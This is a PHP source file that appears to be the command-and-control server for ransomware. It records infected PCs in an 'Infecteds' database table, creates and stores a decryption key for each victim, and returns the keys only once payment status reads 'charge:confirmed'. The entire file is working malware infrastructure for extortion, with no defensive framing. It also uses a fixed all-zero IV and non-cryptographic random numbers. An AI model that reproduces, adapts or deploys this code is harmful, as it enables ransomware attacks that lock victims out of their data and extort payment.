<?php

include('connect.php');

header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    if (!isset($_POST['U-ID']))
    {
        Response(array(
            'success' => false,
            'error' => 'EMPTY_UID'), 400);        
    }
    
    $PCName = empty($_POST['PC-Name']) ? 'DefaultName' : $_POST['PC-Name'];
    
    $searchUID = $pdo->prepare('SELECT COUNT(*) FROM Infecteds WHERE UID = ?');
    
    $searchUID->execute([$_POST['U-ID']]);
    
    $JsonResponse = array();
    
    if ($searchUID->fetchColumn() > 0)
    {
        
        $getExp = $pdo->prepare('SELECT Payment_Status, DecryptionKey, PrivateKey, SessionID FROM Infecteds WHERE UID = ?');
        
        if (!$getExp->execute([$_POST['U-ID']]))
        {
            Response(array(
                'success' => false), 500);               
        }
        
        $ExpDate = $getExp->fetch();
        
        $JsonResponse['success'] = true;
        $JsonResponse['SessionID'] = $ExpDate[3];
        
        if ($ExpDate[0] == 'charge:confirmed')
        {
            
            $UpdatedSessionID = generateRandomString(12);
            
            $UpdateSessionID = $pdo->prepare('UPDATE Infecteds SET SessionID = ?, Payment_Status = ?, Payment_Code = ?, Payment_Link = ? WHERE UID = ?');
            
            if (!$UpdateSessionID->execute([$UpdatedSessionID, '', '', '', $_POST['U-ID']]))
            {
                Response(array(
                    'success' => false), 500);                  
            }
            
            $JsonResponse['Ready'] = true;
            $JsonResponse['SessionID'] = $UpdatedSessionID;
            
        }
        
        $JsonResponse['SecretKey'] = EncryptText($ExpDate[1], $ExpDate[2]);
        $JsonResponse['EncryptionKey'] = $ExpDate[2];

        Response($JsonResponse, 200);
    }
    else
    {
        $AddPcInfected = $pdo->prepare('INSERT INTO Infecteds (PCName, DecryptionKey, PrivateKey, UID, SessionID) VALUES (?,?,?,?,?)');
        
        $SecretKey = generateRandomString(35);
        $ToEncrypt = generateRandomString(35);
        
        $SessionID = generateRandomString(12);
        
        if ($AddPcInfected->execute([$PCName, $SecretKey, $ToEncrypt, $_POST['U-ID'], $SessionID]))
        {
            Response(array(
                'success' => true,
                'Ready' => true,
                'SecretKey' => EncryptText($SecretKey, $ToEncrypt),
                'EncryptionKey' => $ToEncrypt,
                'SessionID' => $SessionID));
        }
        else
        {
            Response(array(
                'success' => false), 500);            
        }
    }
}
else
{
    Response(array(
        'success' => false,
        'error' => 'INVALID_REQUEST_METHOD',
        'request_method' => $_SERVER['REQUEST_METHOD']), 400);
}

function Response($data, $httpres = 200)
{
    http_response_code($httpres);
    
    echo json_encode($data, JSON_PRETTY_PRINT);
    
    die();
}

function EncryptText($plaintext, $password)
{
    $method = 'aes-256-cbc';
    $key = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    return base64_encode(openssl_encrypt($plaintext, $method, $key, OPENSSL_RAW_DATA, $iv));

}

function generateRandomString($length = 10) 
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>
